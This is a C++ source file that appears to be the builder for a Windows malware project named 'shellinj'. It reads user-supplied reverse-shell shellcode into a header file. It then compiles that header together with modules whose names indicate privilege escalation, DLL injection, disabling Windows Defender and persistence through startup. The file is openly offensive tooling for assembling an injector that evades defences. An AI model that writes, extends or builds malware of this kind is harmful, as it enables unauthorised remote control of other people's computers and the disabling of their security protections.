#include <Windows.h>
#include <iostream>
#include <string>
#include <conio.h>
#include <fstream>

void write_reverse_shell_2_shellcodeDOTh(std::string shellcode_path) {

	std::remove("shellcode.h");
	std::ofstream shellfile("shellcode.h");
	std::cout << "recreating shellcode.h \n";
    
	std::ifstream myfile;
	myfile.open(shellcode_path);
	std::string myline;
	if (myfile.is_open()) {
		while (myfile) { // equivalent to myfile.good()
			std::getline(myfile, myline);
			std::cout << myline << '\n';
			shellfile << myline << '\n';
		}
	}
	else {
		std::cout << "[-] Couldn't open file\n";
	}


}


int main() {
	std::cout << "welcome to the shellinj_exmple builder\n\n\n";
	std::string shellcode_path;
	std::cout << "enter file path+name.txt with the shell code shellcode : ";
	std::cin >> shellcode_path;

	write_reverse_shell_2_shellcodeDOTh(shellcode_path);
	std::cout << "[*] writing shell code to shellcode.h\n";

	std::cout << "[*]compiling the program...\n";
	system("g++ shellinj.cpp priv_esc.cpp find_pid.cpp dll_inj.cpp disable_windef.cpp add_to_startup.cpp -o shellinj.exe ");
	getch();

	return 0;
}